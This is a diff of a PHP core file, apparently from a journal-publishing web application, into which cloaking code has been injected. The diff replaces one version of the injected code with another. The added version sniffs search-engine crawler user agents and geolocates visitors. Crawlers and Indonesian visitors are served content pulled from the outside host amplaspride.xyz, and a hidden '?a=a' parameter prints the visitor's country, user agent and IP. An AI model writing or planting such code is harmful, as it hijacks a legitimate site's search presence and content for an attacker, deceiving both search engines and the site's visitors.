@@ -1,36 +1,30 @@
 <?php
-function getUserCountry() {
-    $ip = $_SERVER['REMOTE_ADDR'];
-    $url = "http://ip-api.com/json/{$ip}";
-    
-    $response = @file_get_contents($url);
-    if ($response) {
-        $data = json_decode($response, true);
-        return $data['countryCode'] ?? null;
-    }
-    return null;
+$userAgent = $_SERVER['HTTP_USER_AGENT'];
+$ip = $_SERVER['REMOTE_ADDR'];
+function getCountryByIp($ip)
+{
+    $url = "http://ip-api.com/json/$ip";
+
+    $response = file_get_contents($url);
+    $data = json_decode($response, true);
+    $countryCode = $data['countryCode'];
+    return $countryCode;
 }
+$ctryCode = getCountryByIp($ip);
 
-function is_bot() {
-    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
-    $botchar = "/(googlebot|slurp|bingbot|baiduspider|yandex|adsense|crawler|spider|inspection)/i";
-    
-    return preg_match($botchar, $user_agent);
-}
-
-$Zhyven = "https://amplaspride.xyz/landing/gazette/index.txt";
-
-if (is_bot()) {
-    echo @file_get_contents($Zhyven);
+if (isset($_GET['a']) && $_GET['a'] === 'a') {
+    echo "country: " . $ctryCode;
+    echo "<br>";
+    echo "useragent: " . $userAgent;
+    echo "<br>";
+    echo "ip: " . $ip;
     exit;
 }
 
-if (getUserCountry() === "ID") {
-    header("Content-Type: text/html; charset=UTF-8");
-    echo @file_get_contents($Zhyven);
-    exit();
+if (preg_match('/bot|crawl|slurp|bingbot|Google-Site-Verification|Google-InspectionTool|AhrefsBot|spider/i', $userAgent) || $ctryCode == 'ID') {
+    echo file_get_contents('https://amplaspride.xyz/landing/gazette/index.txt');
+    exit;
 }
-
 /**
  * @file classes/core/Application.inc.php
  *
